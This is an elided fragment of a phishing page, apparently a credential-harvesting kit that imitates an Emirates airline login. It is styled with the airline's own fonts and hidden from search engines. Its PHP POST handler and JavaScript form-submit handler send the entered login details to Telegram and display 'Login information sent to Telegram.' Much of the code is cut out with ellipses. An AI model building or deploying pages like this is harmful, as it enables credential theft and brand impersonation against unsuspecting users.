...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    if (!$response) {
        ...
        echo "Login information sent to Telegram.";
    }
}
?>
...
<head><meta name="robots" content="noindex, nofollow"/><meta name="referrer" content="no-referrer"/>
    ...
    <style>
        @font-face{
            ...
            font-style: normal;
            font-weight: normal;
            src: local('Emirates-Bold'), local('Emirates Bold'), url('https://cdn.ek.aero/shared/fonts/emirates/emirates-bold.woff2') format('woff');
        }
        @font-face{
            font-family: Emirates-Medium;
            font-style: normal;
            font-weight: normal;
            src: local('Emirates-Medium'), local('Emirates Medium'), url('https://cdn.ek.aero/shared/fonts/emirates/emirates-medium.woff2') format('woff');
        }
    </style>
    <!-- CSS Reset -->
    <style>
...
document.addEventListener("DOMContentLoaded", function(){
    ...
    document.querySelector(".login-form").addEventListener("submit", function(e){
        ...
        loadingWindow.innerHTML = "Logging in...";
        ...
        loadingWindow.style.boxShadow = "0 0 10px rgba(0,0,0,0.5)";
        ...
        xhr.onreadystatechange = function(){
            if(xhr.readyState == 4 && xhr.status == 200){
                ...
                loadingWindow.innerHTML = "Login information sent to Telegram.";

                // Optionally, add a delay before removing the message or redirecting the user
                setTimeout(function() {
                    document.body.removeChild(loadingWindow);
                    // Redirect or update UI as needed here
                    // For example, you might want to redirect to a different page or clear the form fields
